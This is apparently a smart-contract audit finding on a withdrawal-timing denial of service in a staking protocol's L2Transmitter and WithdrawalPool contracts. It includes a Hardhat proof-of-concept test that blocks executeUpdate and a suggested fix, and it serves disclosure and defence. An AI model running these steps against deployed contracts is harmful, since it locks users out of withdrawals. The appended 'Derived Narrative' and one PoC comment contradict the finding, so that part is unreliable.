---
id: 22226
severity: "High"
---

# Attacker can manipulate queued withdrawal execution timing on withdrawal pool to prevent withdrawals on L1 indefinitely

## Description

The protocol's `L2Transmitter::executeUpdate` function can be blocked through manipulation of withdrawal timing controls. The vulnerability exists due to a lack of access control on `WithdrawalPool::performUpkeep` combined with shared timing restrictions between withdrawals and L2 transmitter updates.

The key issue stems from the interaction between these functions:
```solidity
// L2Transmitter.sol
function executeQueuedWithdrawals() public {
        uint256 queuedTokens = l2Strategy.getTotalQueuedTokens();
        uint256 queuedWithdrawals = withdrawalPool.getTotalQueuedWithdrawals();
        uint256 toWithdraw = MathUpgradeable.min(queuedTokens, queuedWithdrawals);

        if (toWithdraw == 0) revert CannotExecuteWithdrawals();

        bytes[] memory args = new bytes[](1);
        args[0] = "0x";
        withdrawalPool.performUpkeep(abi.encode(args)); //@audit attacker can front-run this to block execute update
    }

function executeUpdate() external payable {
    if (block.timestamp < timeOfLastUpdate + minTimeBetweenUpdates) { //@audit can only run this once every minTimeBetweenUpdates
        revert InsufficientTimeElapsed();
    }

    if (queuedTokens != 0 && queuedWithdrawals != 0) {
        executeQueuedWithdrawals();  // This calls WithdrawalPool.performUpkeep()
        queuedTokens = l2Strategy.getTotalQueuedTokens();
        queuedWithdrawals = withdrawalPool.getTotalQueuedWithdrawals();
    }
    // ... CCIP processing ...
}
```

In WithdrawalPool.sol:
```solidity
function performUpkeep(bytes calldata _performData) external {
    uint256 canWithdraw = priorityPool.canWithdraw(address(this), 0);
    uint256 totalQueued = _getStakeByShares(totalQueuedShareWithdrawals);
    if (
        totalQueued == 0 ||
        canWithdraw == 0 ||
        block.timestamp <= timeOfLastWithdrawal + minTimeBetweenWithdrawals
    ) revert NoUpkeepNeeded();

    timeOfLastWithdrawal = uint64(block.timestamp);
    // ... withdrawal processing ...
}
```

An attacker can block `L2Transmitter::executeUpdate` by doing the following:

Wait for `minTimeBetweenWithdrawals` to elapse
Call `L2Transmitter::executeQueuedWithdrawals()` right after time elapses
If `queuedWithdrawals` becomes 0: Queue a minimum withdrawal to restore `queuedWithdrawals > 0`

Eventually when `L2Transmitter::executeUpdate` is called, it will try to process withdrawals via `executeQueuedWithdrawals` since `queuedTokens` and `queuedWithdrawals` are both non-zero. This fails because `minTimeBetweenWithdrawals` has not elapsed causing the entire `executeUpdate` to revert.

This attack can be repeated to continuously prevent CCIP updates from being processed. This can potentially prevent withdrawals on L1 indefinitely.

## Proof of Concept

Run the following POC, with `minTimeBetweenWithdrawals` for withdrawal pool as 50,000 and `minTimeBetweenUpdates` for L2Transmitter as 86400. Also, set `allowInstantWithdrawals` to false in PriorityPool.

```solidity
  it('DOS executeUpdate on L1Transmitter', async () => {
    const {
      signers,
      accounts,
      l2Strategy,
      l2Metistoken,
      l2Transmitter,
      stakingPool,
      priorityPool,
      withdrawalPool,
      offRamp,
    } = await loadFixture(deployFixture)

    // // setup Bob and Alice
    const bob = signers[7]
    const bobAddress = accounts[7]
    const alice = signers[8]
    const aliceAddress = accounts[8]

    // 1.0 Fund Alice and Bob token and give necessary approvals
    await l2Metistoken.transfer(bobAddress, toEther(100))
    await l2Metistoken.connect(bob).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(bob).approve(priorityPool.target, ethers.MaxUint256)

    await l2Metistoken.transfer(aliceAddress, toEther(100))
    await l2Metistoken.connect(alice).approve(priorityPool.target, ethers.MaxUint256)
    await stakingPool.connect(alice).approve(priorityPool.target, ethers.MaxUint256)

    // 2.0 Bob deposits 50 METIS and calls executeUpdate on L2Transmitter
    await priorityPool.connect(bob).deposit(toEther(50), false, ['0x'])
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 50)

    await l2Transmitter.executeUpdate({ value: toEther(10) })

    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 50)

    // 3.0 Assume tokens are invested in sequencer vaults on L1 and a message is returned
    await offRamp
      .connect(signers[5]) //@note executes message on L2
      .executeSingleMessage(
        ethers.encodeBytes32String('messageId'),
        777,
        ethers.AbiCoder.defaultAbiCoder().encode(
          ['uint256', 'uint256', 'uint256', 'address[]', 'uint256[]'],
          [toEther(50), 0, toEther(50), [], []]
        ),
        l2Transmitter.target,
        []
      )
    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 50)
    assert.equal(fromEther(await l2Strategy.tokensInTransitToL1()), 0)
    assert.equal(fromEther(await l2Strategy.tokensInTransitFromL1()), 0)
    assert.equal(fromEther(await l2Strategy.l1TotalDeposits()), 50)

    // 4.0 At this point Alice deposits 25 metis
    await priorityPool.connect(alice).deposit(toEther(25), false, ['0x'])

    assert.equal(fromEther(await l2Strategy.getTotalDeposits()), 75)
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 25)
    assert.equal(fromEther(await l2Metistoken.balanceOf(l2Strategy.target)), 25)

    // 5.0 Right before executeUpdate is called on L2Transmitter, Bob withdraws 10 metis
    await priorityPool.connect(bob).withdraw(
      toEther(10),
      0,
      0,
      [],
      false,
      true, // queue withdrawal
      ['0x']
    )

    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 10)

    // 6.0 Bob then calls executeQueuedWithdrawals
    await time.increase(50001) // 50000 seconds is min time between withdrawals
    await l2Transmitter.executeQueuedWithdrawals()

    // At this point queued withdrawals is 5, queued tokens is 0
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 15)
    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 0)

    // // 7.0 Bob again places a 10 metis withdrawal
    await priorityPool.connect(bob).withdraw(
      toEther(10),
      0,
      0,
      [],
      false,
      true, // queue withdrawal
      ['0x']
    )
    assert.equal(fromEther(await l2Strategy.getTotalQueuedTokens()), 15)
    assert.equal(fromEther(await withdrawalPool.getTotalQueuedWithdrawals()), 10)

    await time.increase(36401) // 50001 + 36401 > 86400. So from the initial time, we are now 86401 seconds
    // we should be able to again run execute update

    await expect(l2Transmitter.executeUpdate({ value: toEther(10) })).to.be.revertedWithCustomError(
      withdrawalPool,
      'NoUpkeepNeeded'
    )
  })
```

## Recommendation

In `L2Transmitter::executeQueuedWithdrawals`, consider calling `WithdrawalPool::performUpkeep` only when `WithdrawalPool::checkUpkeep` is `true`.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a timing‑based denial‑of‑service in the withdrawal flow of the staking protocol. The L2Transmitter contract is responsible for periodically calling executeUpdate, which first attempts to process queued withdrawals by invoking WithdrawalPool.performUpkeep. WithdrawalPool.performUpkeep contains a check that requires block.timestamp to be greater than timeOfLastWithdrawal + minTimeBetweenWithdrawals. Because executeUpdate does not verify whether performUpkeep would succeed before calling it, an attacker who can front‑run the call can deliberately trigger a withdrawal just before the minTimeBetweenWithdrawals interval expires, causing performUpkeep to revert with NoUpkeepNeeded. The revert propagates back to executeUpdate, which then reverts entirely and prevents any further CCIP update or L1 withdrawal processing. By repeatedly repeating this pattern—waiting for the withdrawal cooldown to elapse, queuing a minimal withdrawal, and calling executeQueuedWithdrawals at the last moment—the attacker can keep the withdrawal pool in a state where the cooldown has not elapsed, effectively blocking executeUpdate forever. The impact is that users who expect their L1 withdrawals to be processed see no funds transferred; balances on L1 remain unchanged, and the UI may show pending withdrawals that never resolve. The issue was discovered during a security audit that examined the interaction between L2Transmitter.executeUpdate and WithdrawalPool.performUpkeep and identified the missing access control and shared timing restriction as an attack surface. The bug is hard to notice because the contracts function correctly when withdrawals are spaced out normally; only a malicious actor who can precisely time calls can trigger the failure, and the revert message originates from the withdrawal pool, not the transmitter, making the root cause less obvious. The vulnerability belongs to the class of timing‑dependency denial‑of‑service or front‑runable state‑dependency bugs, where one contract’s internal timing checks can be abused by another contract’s public function. To remediate, the transmitter should check WithdrawalPool.checkUpkeep (or an equivalent guard) before invoking performUpkeep, or redesign the withdrawal cooldown logic so that executeUpdate can proceed even when a withdrawal cannot be processed. This would restore the expected behavior that users can withdraw funds and that protocol updates continue even under adversarial timing.
